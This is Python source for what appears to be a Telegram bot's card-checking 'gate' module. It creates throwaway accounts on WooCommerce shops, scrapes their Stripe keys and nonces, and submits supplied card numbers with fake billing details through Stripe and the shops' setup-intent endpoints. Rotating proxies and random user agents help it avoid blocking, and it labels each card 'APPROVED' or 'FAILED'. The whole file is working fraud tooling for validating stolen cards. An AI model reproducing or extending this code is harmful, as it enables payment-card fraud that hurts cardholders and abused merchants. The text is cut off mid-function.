import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import json
import threading
import os
import logging
import fcntl
from urllib.parse import urlparse, quote
from typing import Optional, Tuple, Dict, Any, List
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

_BOT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# ============================================
# GATE HUNTER FIXED - FROM REFERENCE CODE AS-IS
# Only change: proxy passed per-request from bot
# ============================================

class GateHunterFixed:
    def __init__(self, cache_file: str = "working_gates.txt", expiry_minutes: int = 30):
        self.cache_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), cache_file)
        self.expiry_minutes = expiry_minutes
        self.ua = UserAgent()

        self.found_patterns = {
            'stripe_key_pattern': None,
            'nonce_pattern': None,
            'setup_nonce_pattern': None,
        }

        self.working_payment_pattern = {
            'endpoint_url': None,
            'endpoint_desc': None,
            'payload_name': None,
            'payload_data': None,
            'content_type': None,
            'content_desc': None,
        }

        self._session_cache = {}
        self._session_lock = threading.Lock()
        self._nonce_cache = {}
        self._nonce_lock = threading.Lock()

    def create_new_session(self, proxy_dict: Dict) -> requests.Session:
        session = requests.Session()
        session.verify = False
        session.proxies.update(proxy_dict)
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        })
        return session

    def _get_cached_session(self, domain: str, proxy_dict: Dict) -> Tuple[requests.Session, bool]:
        return None, False

    def _save_session_cache(self, domain: str, session: requests.Session):
        pass

    def _get_cached_nonce(self, domain: str):
        return None

    def _save_nonce_cache(self, domain: str, nonce: str):
        pass

    def save_gate_details(self, domain: str, stripe_key: str, nonce: str, setup_nonce: str, cookies: Dict = None):
        try:
            cache_data = {}
            if os.path.exists(self.cache_file):
                with open(self.cache_file, 'r') as f:
                    try:
                        cache_data = json.load(f)
                    except json.JSONDecodeError:
                        cache_data = {}

            gate_info = {
                'stripe_key': stripe_key,
                'timestamp': datetime.now().isoformat(),
                'permanent': True,
                'payment_pattern': self.working_payment_pattern.copy() if self.working_payment_pattern['endpoint_url'] else None
            }

            cache_data[domain] = gate_info

            with open(self.cache_file, 'w') as f:
                json.dump(cache_data, f, indent=2)

            pass  # PERF: stdout removed
            if gate_info['payment_pattern']:
                pass  # PERF: stdout removed
                pass  # PERF: stdout removed
                pass  # PERF: stdout removed
                pass  # PERF: stdout removed
        except Exception as e:
            pass  # PERF: stdout removed
    def load_gate_details(self, domain: str) -> Optional[Dict]:
        try:
            if not os.path.exists(self.cache_file):
                return None
            with open(self.cache_file, 'r') as f:
                cache_data = json.load(f)
            if domain not in cache_data:
                return None
            return cache_data[domain]
        except Exception as e:
            return None

    def is_gate_valid(self, gate_data: Dict) -> bool:
        try:
            if not gate_data:
                return False
            if 'stripe_key' not in gate_data:
                return False
            age_str = ""
            if 'timestamp' in gate_data:
                try:
                    saved_time = datetime.fromisoformat(gate_data['timestamp'])
                    age_min = (datetime.now() - saved_time).total_seconds() / 60
                    age_str = f" (age: {age_min:.1f} min)"
                except:
                    pass
            pass  # PERF: stdout removed
            return True
        except Exception as e:
            return False

    def normalize_url(self, url: str) -> str:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        return base_url.rstrip('/')

    def get_with_session(self, session: requests.Session, url: str, referer: str = None) -> Optional[requests.Response]:
        headers = {'User-Agent': self.ua.random}
        if referer:
            headers['Referer'] = referer
        try:
            response = session.get(url, headers=headers, timeout=15, verify=False)
            return response
        except Exception as e:
            pass  # PERF: stdout removed
            return None

    def post_with_session(self, session: requests.Session, url: str, data: Dict, referer: str = None, content_type: str = None, extra_headers: Dict = None) -> Optional[requests.Response]:
        headers = {'User-Agent': self.ua.random}
        if referer:
            headers['Referer'] = referer
        if content_type:
            headers['Content-Type'] = content_type
        else:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        if extra_headers:
            headers.update(extra_headers)
        try:
            response = session.post(url, data=data, headers=headers, timeout=15, verify=False)
            return response
        except Exception as e:
            pass  # PERF: stdout removed
            return None

    def login_user(self, session: requests.Session, domain: str, username: str, password: str) -> bool:
        base_url = self.normalize_url(domain)
        login_url = f"{base_url}/my-account/"

        response = self.get_with_session(session, login_url, referer=base_url)
        if not response or response.status_code != 200:
            return False

        html = response.text

        login_nonce = None
        nonce_patterns = [
            r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([a-f0-9]{8,12})["\']',
            r'name=["\']_wpnonce["\'][^>]*value=["\']([a-f0-9]{8,12})["\']',
        ]
        for pat in nonce_patterns:
            m = re.search(pat, html)
            if m:
                login_nonce = m.group(1)
                break

        if not login_nonce:
            return False

        login_data = {
            'username': username,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
            'rememberme': 'forever',
        }

        time.sleep(random.uniform(0.3, 0.8))
        login_resp = self.post_with_session(session, login_url, data=login_data, referer=login_url)
        if login_resp and login_resp.status_code in [200, 302]:
            resp_text = login_resp.text
            if any(ind in resp_text for ind in ['Log out', 'Logout', 'Dashboard', 'my-account']):
                pass  # PERF: stdout removed
                return True
        return False

    def verify_logged_in(self, session: requests.Session, domain: str) -> bool:
        base_url = self.normalize_url(domain)
        resp = self.get_with_session(session, f"{base_url}/my-account/", referer=base_url)
        if resp and resp.status_code == 200:
            if any(ind in resp.text for ind in ['Log out', 'Logout', 'Dashboard']):
                return True
        return False

    def register_user(self, session: requests.Session, domain: str, proxy_dict: Dict = None) -> Tuple[bool, str]:
        pass  # PERF: stdout removed
        base_url = self.normalize_url(domain)
        reg_url = f"{base_url}/my-account/"

        try:
            proxies = proxy_dict if proxy_dict else {}
            reg_response = session.get(reg_url, proxies=proxies, timeout=(15, 30), verify=False,
                                       headers={'User-Agent': self.ua.random})

            if 'Log out' in reg_response.text or 'My Account' in reg_response.text:
                return True, "Already logged in"

            reg_nonce_patterns = [
                r'name="woocommerce-register-nonce" value="([^"]+)"',
                r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
                r'register-nonce["\']?:\s*["\']([^\s"\']+)["\']',
                r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^\s"\']+)["\']'
            ]

            reg_nonce = None
            for pattern in reg_nonce_patterns:
                match = re.search(pattern, reg_response.text)
                if match:
                    reg_nonce = match.group(1)
                    break

            if not reg_nonce:
                form_match = re.search(r'class="register"[\s\S]*?name="_wpnonce" value="([^"]+)"', reg_response.text)
                if form_match:
                    reg_nonce = form_match.group(1)

            if not reg_nonce:
                return False, "Could not extract registration nonce"

            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            email = f"{username}@gmail.com"
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

            reg_data = {
                'username': username,
                'email': email,
                'password': password,
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }

            reg_result = session.post(
                reg_url,
                data=reg_data,
                headers={'Referer': reg_url, 'User-Agent': self.ua.random},
                proxies=proxies,
                timeout=(8, 15),
                verify=False
            )

            if 'Log out' in reg_result.text or 'My Account' in reg_result.text or 'Registration successful' in reg_result.text:
                pass  # PERF: stdout removed
                return True, email
            else:
                return False, "Registration failed"
        except Exception as e:
            return False, f"Registration error: {str(e)[:80]}"

    def get_payment_page_data(self, session: requests.Session, domain: str, use_cache: bool = True) -> Tuple[Optional[str], Optional[str], Optional[str], Optional[Dict]]:
        saved_pattern = None
        cached_stripe_key = None

        if use_cache:
            cached_data = self.load_gate_details(domain)
            if cached_data and self.is_gate_valid(cached_data):
                pass  # PERF: stdout removed
                if 'payment_pattern' in cached_data and cached_data['payment_pattern']:
                    saved_pattern = cached_data['payment_pattern']
                    pass  # PERF: stdout removed
                cached_stripe_key = cached_data.get('stripe_key')
                if cached_stripe_key:
                    pass  # PERF: stdout removed
            else:
                pass  # PERF: stdout removed
        base_url = self.normalize_url(domain)

        payment_urls = [
            f"{base_url}/my-account/add-payment-method/",
            f"{base_url}/checkout/",
            f"{base_url}/my-account/",
        ]

        for url in payment_urls:
            pass  # PERF: stdout removed
            response = self.get_with_session(session, url, referer=base_url)
            if not response or response.status_code != 200:
                continue

            html = response.text

            stripe_key = cached_stripe_key
            if not stripe_key:
                stripe_patterns = [
                    (r'pk_live_[a-zA-Z0-9_]{24,100}', 'Basic Stripe live key'),
                    (r'"publishableKey":"(pk_live_[^"]+)"', 'JSON publishableKey'),
                    (r"'publishableKey':'([^']+)'", 'Single quote publishableKey'),
                    (r'stripe\.com/v3/(pk_live_[^"\']+)', 'Stripe v3 URL'),
                    (r'var stripe = Stripe\(["\']([^"\']+)["\']\)', 'Stripe JS constructor'),
                    (r'"stripe_key":"([^"]+)"', 'stripe_key JSON'),
                ]

                for pattern, pattern_name in stripe_patterns:
                    match = re.search(pattern, html)
                    if match:
                        if 'pk_live_' in match.group(0):
                            stripe_key = match.group(0) if 'pk_live_' in match.group(0) else match.group(1)
                        else:
                            stripe_key = match.group(1)

                        if stripe_key and 'pk_live_' in stripe_key:
                            stripe_key = stripe_key[stripe_key.find('pk_live_'):]
                            stripe_key = stripe_key.split('"')[0].split("'")[0].split('\\')[0]

                        self.found_patterns['stripe_key_pattern'] = pattern_name
                        pass  # PERF: stdout removed
                        break

            nonce = None
            nonce_patterns = [
                (r'name=["\']_ajax_nonce["\'][^>]*value=["\']([a-f0-9]{8,12})["\']', '_ajax_nonce'),
                (r'data-nonce=["\']([a-f0-9]{8,12})["\']', 'data-nonce'),
                (r'"nonce":"([a-f0-9]{8,12})"', 'JSON nonce'),
                (r"'nonce':'([a-f0-9]{8,12})'", 'Single quote nonce'),
                (r'name=["\']security["\'][^>]*value=["\']([a-f0-9]{8,12})["\']', 'security'),
                (r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([a-f0-9]{8,12})["\']', 'woocommerce add payment'),
                (r'var wc_stripe_params = \{[^}]*nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'wc_stripe_params'),
                (r'nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'generic nonce'),
            ]

            for pattern, pattern_name in nonce_patterns:
                match = re.search(pattern, html)
                if match:
                    nonce = match.group(1)
                    self.found_patterns['nonce_pattern'] = pattern_name
                    pass  # PERF: stdout removed
                    break

            setup_nonce = None
            setup_patterns = [
                (r'create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'create_and_confirm_setup_intent'),
                (r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'camelCase'),
                (r'wc_stripe_create_and_confirm_setup_intent["\'][^}]*nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'wc_stripe_create'),
                (r'"wc_stripe_setup_intent_nonce":"([a-f0-9]{8,12})"', 'wc_stripe_setup_intent'),
                (r'add_payment_method_nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'add_payment_method'),
            ]

            for pattern, pattern_name in setup_patterns:
                match = re.search(pattern, html)
                if match:
                    setup_nonce = match.group(1)
                    self.found_patterns['setup_nonce_pattern'] = pattern_name
                    pass  # PERF: stdout removed
                    break

            if stripe_key or nonce or setup_nonce:
                return stripe_key, nonce, setup_nonce, saved_pattern

        return None, None, None, None

    def create_stripe_payment_token(self, stripe_key: str, card_details: Dict, proxy_dict: Dict = None) -> Tuple[bool, Optional[str], str]:
        pass  # PERF: stdout removed
        try:
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="121", "Chromium";v="121", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': self.ua.random,
            }

            stripe_mid = str(uuid.uuid4())
            stripe_sid = str(uuid.uuid4())

            data = {
                'type': 'card',
                'card[number]': card_details['number'],
                'card[cvc]': card_details['cvc'],
                'card[exp_month]': card_details['month'],
                'card[exp_year]': card_details['year'],
                'billing_details[address][line1]': f'{random.randint(1,999)} Main St',
                'billing_details[address][city]': random.choice(['London', 'Manchester', 'Birmingham', 'Leeds', 'Bristol']),
                'billing_details[address][state]': random.choice(['London', 'Manchester', 'Birmingham', 'Leeds', 'Bristol']),
                'billing_details[address][postal_code]': f'SW{random.randint(1,9)}A {random.randint(1,9)}AA',
                'billing_details[address][country]': 'GB',
                'billing_details[name]': ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize() + ' ' + ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize(),
                'billing_details[email]': ''.join(random.choices(string.ascii_lowercase, k=8)) + str(random.randint(10,99)) + '@gmail.com',
                'key': stripe_key,
                '_stripe_version': '2024-11-20.acacia',
                'payment_user_agent': 'stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element',
                'guid': str(uuid.uuid4()),
                'muid': stripe_mid,
                'sid': stripe_sid,
            }

            time.sleep(random.uniform(0.3, 0.6))

            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                proxies=proxy_dict if proxy_dict else None,
                timeout=15,
                verify=False
            )

            pass  # PERF: stdout removed
            if response.status_code == 200:
                result = response.json()
                if 'id' in result:
                    payment_token = result['id']
                    pass  # PERF: stdout removed
                    return True, payment_token, response.text

            return False, None, response.text

        except Exception as e:
            pass  # PERF: stdout removed
            return False, None, str(e)

    def confirm_setup_intent_with_saved_pattern(self, session: requests.Session, domain: str, payment_token: str, nonce: str, pattern: Dict) -> Tuple[bool, Dict]:
        pass  # PERF: stdout removed
        pass  # PERF: stdout removed
        pass  # PERF: stdout removed
        pass  # PERF: stdout removed
        base_url = self.normalize_url(domain)
        endpoint_url = pattern.get('endpoint_url')

        if not endpoint_url:
            return False, {'error': 'No endpoint URL'}

        payload_data = pattern.get('payload_data', {}).copy() if pattern.get('payload_data') else {}

        keys_to_remove = [k for k in payload_data.keys() if 'payment' in k.lower() or 'stripe' in k.lower()]
        for key in keys_to_remove:
            del payload_data[key]

        payload_data['wc-stripe-payment-method'] = payment_token
        payload_data['payment_method'] = payment_token

        nonce_keys = ['_ajax_nonce', 'nonce', 'security', '_wpnonce']
        for key in nonce_keys:
            if key in payload_data:
                del payload_data[key]

        payload_data['_ajax_nonce'] = nonce

        extra_headers = {
            'X-Requested-With': 'XMLHttpRequest',
        }

        try:
            response = self.post_with_session(
                session,
                endpoint_url,
                data=payload_data,
                referer=f"{base_url}/my-account/add-payment-method/",
                content_type=pattern.get('content_type', 'application/x-www-form-urlencoded'),
                extra_headers=extra_headers
            )

            if response:
                response_text = response.text if response.text else "<EMPTY RESPONSE>"
                pass  # PERF: stdout removed
                try:
                    result = response.json()
                    if result.get('success') is True or result.get('data', {}).get('status') == 'succeeded':
                        return True, {'result': result, 'is_json': True}
                    elif 'error' in str(result).lower():
                        return False, {'result': result, 'is_json': True}
                except:
                    text = response.text.lower() if response.text else ""
                    if any(x in text for x in ['succeeded', 'success', 'confirmed']):
                        return True, {'result': response.text, 'is_json': False}
                    elif any(x in text for x in ['decline', 'error', 'failed']):
                        return False, {'result': response.text, 'is_json': False}

        except Exception as e:
            pass  # PERF: stdout removed
        pass  # PERF: stdout removed
        return False, {'error': 'Saved pattern failed'}

    def confirm_setup_intent_with_session(self, session: requests.Session, domain: str, payment_token: str, nonce: str, use_saved_pattern: bool = False, saved_pattern: Dict = None) -> Tuple[bool, Dict]:
        base_url = self.normalize_url(domain)

        if use_saved_pattern and saved_pattern and saved_pattern.get('endpoint_url'):
            result_status, result_data = self.confirm_setup_intent_with_saved_pattern(session, domain, payment_token, nonce, saved_pattern)
            if result_status or 'error' not in result_data:
                return result_status, result_data

        endpoints = [
            (f"{base_url}/wp-admin/admin-ajax.php?action=wc_stripe_create_and_confirm_setup_intent", "Admin AJAX with action param"),
            (f"{base_url}/wp-admin/admin-ajax.php", "Standard admin AJAX"),
            (f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "WC AJAX endpoint"),
            (f"{base_url}/my-account/add-payment-method/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "Account page WC AJAX"),
        ]

        payloads = [
            {
                'name': 'Standard WooCommerce Stripe',
                'data': {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': payment_token,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': nonce,
                }
            },
            {
                'name': 'Simple payment method',
                'data': {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'payment_method': payment_token,
                    '_ajax_nonce': nonce,
                }
            },
            {
                'name': 'Alternative nonce key',
                'data': {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'payment_method': payment_token,
                    'nonce': nonce,
                }
            },
            {
                'name': 'Security key nonce',
                'data': {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'payment_method': payment_token,
                    'security': nonce,
                }
            },
            {
                'name': 'JSON format payload',
                'data': {
                    'action': 'wc_stripe_create_setup_intent',
                    'payment_method': payment_token,
                    '_wpnonce': nonce,
                }
            }
        ]

        for endpoint_url, endpoint_desc in endpoints:
            for payload in payloads:
                pass  # PERF: stdout removed
                content_types = [
                    ('application/x-www-form-urlencoded', 'Form URL encoded'),
                    ('application/json', 'JSON'),
                ]

                for content_type, content_desc in content_types:
                    headers = {
                        'User-Agent': self.ua.random,
                        'Referer': f"{base_url}/my-account/add-payment-method/",
                        'X-Requested-With': 'XMLHttpRequest',
                        'Content-Type': content_type,
                    }

                    try:
                        if content_type == 'application/json':
                            response = session.post(
                                endpoint_url,
                                json=payload['data'],
                                headers=headers,
                                timeout=15,
                                verify=False
                            )
                        else:
                            response = session.post(
                                endpoint_url,
                                data=payload['data'],
                                headers=headers,
                                timeout=15,
                                verify=False
                            )

                        if response:
                            response_text = response.text if response.text else "<EMPTY RESPONSE>"
                            pass  # PERF: stdout removed
                            is_json = False
                            result = {}
                            try:
                                result = response.json()
                                is_json = True
                            except:
                                is_json = False

                            should_stop = False
                            success = False

                            if is_json:
                                if isinstance(result, dict):
                                    if result.get('success') is True or result.get('data', {}).get('status') == 'succeeded':
                                        success = True
                                        should_stop = True
                                    elif 'error' in str(result).lower() and any(x in str(result).lower() for x in ['decline', 'card', 'cvv', 'expired', 'funds', 'security code']):
                                        success = False
                                        should_stop = True
                            else:
                                response_text_lower = response.text.lower() if response.text else ""
                                if any(ind in response_text_lower for ind in ['succeeded', 'success', 'confirmed']):
                                    success = True
                                    should_stop = True
                                elif any(ind in response_text_lower for ind in ['decline', 'card', 'cvv', 'expired', 'funds']):
                                    success = False
                                    should_stop = True

                            if should_stop:
                                self.working_payment_pattern = {
                                    'endpoint_url': endpoint_url,
                                    'endpoint_desc': endpoint_desc,
                                    'payload_name': payload['name'],
                                    'payload_data': payload['data'],
                                    'content_type': content_type,
                                    'content_desc': content_desc,
                                }
                                pass  # PERF: stdout removed
                                pass  # PERF: stdout removed
                                pass  # PERF: stdout removed
                                pass  # PERF: stdout removed
                                return success, {'result': result, 'is_json': is_json}

                    except Exception as e:
                        pass  # PERF: stdout removed
                        continue

        return False, {'error': 'All attempts failed'}

    def process_single_gate(self, domain: str, ccx: str, proxy_dict: Dict, use_cache: bool = True) -> Dict:
        pass  # PERF: stdout removed
        pass  # PERF: stdout removed
        pass  # PERF: stdout removed
        start_time = time.time()
        saved_pattern = None

        self.working_payment_pattern = {
            'endpoint_url': None,
            'endpoint_desc': None,
            'payload_name': None,
            'payload_data': None,
            'content_type': None,
            'content_desc': None,
        }

        try:
            try:
                n, mm, yy, cvc = ccx.strip().split("|")
            except:
                return {'status': 'ERROR', 'response': 'Invalid card format', 'time': 0}

            if len(yy) == 4:
                yy = yy[2:]

            card_details = {
                'number': n.replace(' ', ''),
                'cvc': cvc,
                'month': mm,
                'year': yy
            }

            base_url = self.normalize_url(domain)

            cached_data = self.load_gate_details(domain) if use_cache else None
            has_cached_pattern = cached_data and self.is_gate_valid(cached_data) and cached_data.get('payment_pattern')
            cached_stripe_key = cached_data.get('stripe_key') if cached_data else None

            if has_cached_pattern and cached_stripe_key:
                saved_pattern = cached_data['payment_pattern']
                pass  # PERF: stdout removed
                cached_session, reused = self._get_cached_session(domain, proxy_dict)

                if reused:
                    session = cached_session
                    cached_nonce = self._get_cached_nonce(domain)

                    if cached_nonce:
                        use_nonce = cached_nonce
                        pm_success, payment_token, pm_raw = self.create_stripe_payment_token(cached_stripe_key, card_details, proxy_dict)
                    else:
                        def _get_nonce():
                            pay_url = f"{base_url}/my-account/add-payment-method/"
                            r = self.get_with_session(session, pay_url, referer=base_url)
                            if r and r.status_code == 200:
                                html = r.text
                                for pat in [
                                    r'createAndConfirmSetupIntentNonce["\']?\s*[=:]\s*["\']([a-f0-9]{8,12})["\']',
                                    r'create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']',
                                    r'"nonce":"([a-f0-9]{8,12})"',
                                    r'nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']',
                                ]:
                                    m = re.search(pat, html)
                                    if m:
                                        return m.group(1)
                            return None

                        def _get_pm():
                            return self.create_stripe_payment_token(cached_stripe_key, card_details, proxy_dict)

                        with ThreadPoolExecutor(max_workers=2) as executor:
                            nonce_future = executor.submit(_get_nonce)
                            pm_future = executor.submit(_get_pm)
                            use_nonce = nonce_future.result()
                            pm_success, payment_token, pm_raw = pm_future.result()

                    if not use_nonce:
                        use_nonce = 'fallback_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

                    if not pm_success:
                        return {'status': 'FAILED', 'response': pm_raw, 'time': time.time() - start_time}

                    pass  # PERF: stdout removed
                    setup_success, setup_result = self.confirm_setup_intent_with_session(
                        session, domain, payment_token, use_nonce,
                        use_saved_pattern=True, saved_pattern=saved_pattern
                    )

                    elapsed = time.time() - start_time
                    response_text = self._extract_response_text(setup_result)

                    if 'verify your request' in response_text.lower() or 'refresh the page' in response_text.lower():
                        pass  # PERF: stdout removed
                        with self._nonce_lock:
                            self._nonce_cache.pop(domain, None)
                        with self._session_lock:
                            self._session_cache.pop(domain, None)
                    else:
                        if use_nonce and len(use_nonce) >= 8 and not use_nonce.startswith('fallback_'):
                            self._save_nonce_cache(domain, use_nonce)

                    return {
                        'status': 'APPROVED' if setup_success else 'FAILED',
                        'response': response_text if response_text else ('Approved' if setup_success else 'All payment attempts failed'),
                        'time': elapsed
                    }

            cached_session, has_cache = self._get_cached_session(domain, proxy_dict)

            if has_cache and cached_session:
                session = cached_session
                pass  # PERF: stdout removed
            else:
                session = self.create_new_session(proxy_dict)

                pass  # PERF: stdout removed
                home_response = self.get_with_session(session, base_url)
                if not home_response:
                    # Try to distinguish: is the proxy dead, or is this site blocking the proxy?
                    try:
                        test_resp = requests.get(
                            "http://ip-api.com/json/?fields=query",
                            proxies=proxy_dict,
                            timeout=6,
                            verify=False
                        )
                        proxy_alive = test_resp.status_code == 200
                    except Exception:
                        proxy_alive = False

                    if proxy_alive:
                        return {
                            'status': 'FAILED',
                            'response': 'Site ne proxy block kar diya ❌ — Residential proxy use karo (datacenter/free proxy yahan kaam nahi karta)',
                            'time': time.time() - start_time
                        }
                    else:
                        return {
                            'status': 'FAILED',
                            'response': 'Proxy dead ho gayi ❌ — Naya proxy add karo /addproxy se',
                            'time': time.time() - start_time
                        }
                pass  # PERF: stdout removed
                reg_success, reg_email = self.register_user(session, domain, proxy_dict)
                pass  # PERF: stdout removed
            pass  # PERF: stdout removed
            stripe_key, nonce, setup_nonce, saved_pattern = self.get_payment_page_data(session, domain, use_cache=use_cache)

            if not stripe_key:
                return {'status': 'FAILED', 'response': 'No Stripe key found', 'time': time.time() - start_time}

            pass  # PERF: stdout removed
            use_nonce = setup_nonce if setup_nonce else nonce
            if not use_nonce:
                use_nonce = 'fallback_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

            pass  # PERF: stdout removed
            if use_cache and saved_pattern:
                pass  # PERF: stdout removed
            pass  # PERF: stdout removed
            pm_success, payment_token, pm_raw_response = self.create_stripe_payment_token(stripe_key, card_details, proxy_dict)
            if not pm_success:
                return {'status': 'FAILED', 'response': pm_raw_response, 'time': time.time() - start_time}

            pass  # PERF: stdout removed
            setup_success, setup_result = self.confirm_setup_intent_with_session(
                session, domain, payment_token, use_nonce,
                use_saved_pattern=use_cache,
                saved_pattern=saved_pattern
            )

            if self.working_payment_pattern['endpoint_url']:
                self.save_gate_details(domain, stripe_key, nonce, setup_nonce)
                pass  # PERF: stdout removed
            fresh_nonce = setup_nonce if setup_nonce else nonce
            if fresh_nonce and len(fresh_nonce) >= 8:
                self._save_nonce_cache(domain, fresh_nonce)

            self._save_session_cache(domain, session)

            elapsed = time.time() - start_time
            response_text = self._extract_response_text(setup_result)

            return {
                'status': 'APPROVED' if setup_success else 'FAILED',
                'response': response_text if response_text else ('Approved' if setup_success else 'All payment attempts failed'),
                'time': elapsed
            }

        except Exception as e:
            return {'status': 'ERROR', 'response': str(e), 'time': time.time() - start_time}

    def _extract_response_text(self, setup_result):
        response_text = ""
        if isinstance(setup_result, dict):
            r = setup_result.get('result', {})
            if isinstance(r, dict):
                response_text = json.dumps(r)
            elif isinstance(r, str):
                response_text = r
            else:
                response_text = str(r)
            if 'error' in setup_result:
                response_text = setup_result['error']
        return response_text


# ============================================
# SINGLE GLOBAL INSTANCE
# ============================================
hunter = GateHunterFixed(cache_file="working_gates.txt", expiry_minutes=30)


# ============================================
# SITE MANAGEMENT (bot calls these)
# ============================================
HARDCODED_SITES = ["rubyatelier.com"]
current_site_index = 0
site_lock = threading.Lock()

SITES_FILE = os.path.join(_BOT_ROOT, "sites_config.json")

def _load_sites_from_file():
    global HARDCODED_SITES
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, 'r') as f:
                data = json.load(f)
                sites = data.get('sites', [])
                if sites:
                    HARDCODED_SITES = sites
    except:
        pass

def _save_sites_to_file():
    try:
        with open(SITES_FILE, 'w') as f:
            json.dump({'sites': HARDCODED_SITES}, f, indent=2)
    except:
        pass

_load_sites_from_file()

def add_site(domain):
    global HARDCODED_SITES
    with site_lock:
        domain = domain.strip().lower().replace('https://', '').replace('http://', '').rstrip('/')
        if domain and domain not in HARDCODED_SITES:
            HARDCODED_SITES.append(domain)
            _save_sites_to_file()
            return True
        return False

def remove_site(domain):
    global HARDCODED_SITES
    with site_lock:
        domain = domain.strip().lower().replace('https://', '').replace('http://', '').rstrip('/')
        if domain in HARDCODED_SITES:
            HARDCODED_SITES.remove(domain)
            _save_sites_to_file()
            return True
        return False

def get_all_sites():
    return HARDCODED_SITES.copy()

def clear_all_sites():
    global HARDCODED_SITES
    with site_lock:
        HARDCODED_SITES = []
        _save_sites_to_file()

def get_next_site():
    with site_lock:
        global current_site_index
        if not HARDCODED_SITES:
            return None
        site = HARDCODED_SITES[current_site_index % len(HARDCODED_SITES)]
        current_site_index = (current_site_index + 1) % len(HARDCODED_SITES)
        return site


# ============================================
# PROXY MANAGEMENT (bot calls these)
# ============================================
USER_PROXIES_FILE = os.path.join(_BOT_ROOT, "user_proxies.json")
PROXIES_TXT_FILE = os.path.join(_BOT_ROOT, "proxies.txt")
OWNER_ID = "7180542292"
proxy_lock = threading.Lock()

PROXY_FAIL_TRACKER = {}
PROXY_FAIL_LOCK = threading.Lock()
MAX_PROXY_FAILURES = 3

def is_proxy_connection_error(error_str):
    proxy_error_keywords = [
        'proxyerror', 'proxy error', 'unable to connect to proxy',
        'tunnel connection failed', 'cannot connect to proxy',
        'connection refused', 'connecttimeout', 'proxyconnectionerror',
        'socksproxyerror', '402 payment required', '407 proxy authentication',
        'newconnectionerror'
    ]
    error_lower = error_str.lower()
    if 'read timed out' in error_lower or 'readtimeout' in error_lower:
        return False
    return any(keyword in error_lower for keyword in proxy_error_keywords)

def track_proxy_failure(chat_id, proxy_raw):
    if not proxy_raw or not chat_id:
        return False
    with PROXY_FAIL_LOCK:
        key = f"{chat_id}:{proxy_raw}"
        PROXY_FAIL_TRACKER[key] = PROXY_FAIL_TRACKER.get(key, 0) + 1
        if PROXY_FAIL_TRACKER[key] >= MAX_PROXY_FAILURES:
            del PROXY_FAIL_TRACKER[key]
            remove_dead_proxy_for_user(chat_id, proxy_raw)
            pass  # PERF: stdout removed
            return True
    return False

def reset_proxy_failure(chat_id, proxy_raw):
    if not proxy_raw or not chat_id:
        return
    with PROXY_FAIL_LOCK:
        key = f"{chat_id}:{proxy_raw}"
        if key in PROXY_FAIL_TRACKER:
            del PROXY_FAIL_TRACKER[key]

def load_user_proxies():
    try:
        if os.path.exists(USER_PROXIES_FILE):
            with open(USER_PROXIES_FILE, "r") as f:
                content = f.read()
                if not content:
                    return {}
                return json.loads(content)
    except Exception as e:
        pass  # PERF: stdout removed
    return {}

def save_user_proxies(data):
    with proxy_lock:
        try:
